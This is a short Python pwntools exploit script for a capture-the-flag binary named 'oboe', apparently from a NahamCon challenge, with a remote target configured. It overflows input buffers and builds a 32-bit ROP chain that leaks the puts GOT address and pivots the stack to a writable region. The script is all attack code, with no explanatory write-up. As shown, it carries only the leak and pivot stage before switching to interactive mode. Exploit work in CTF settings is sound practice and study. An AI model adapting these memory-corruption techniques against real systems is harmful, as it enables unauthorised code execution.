#!/usr/bin/python3

from pwn import *

exe = ELF('oboe', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*build+312

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('challenge.nahamcon.com', 30985)
else:
        p = process(exe.path)

GDB()
payload = b"a"*64
sla(b"protocol:\n", b"a"*64)
sla(b"domain:\n", b"a"*64)
pop_ebx_ebp = 0x0804858b
writeable = 0x0804a000 + 0x205
leave_ret = 0x08048485

rop = flat(
        exe.sym["puts"], pop_ebx_ebp, exe.got['puts'], writeable,
        exe.sym['getInput'], leave_ret, writeable 
)

payload =b"a" * 10 +  rop
payload = payload.ljust(63)
sla(b"path:\n", payload)
p.interactive()
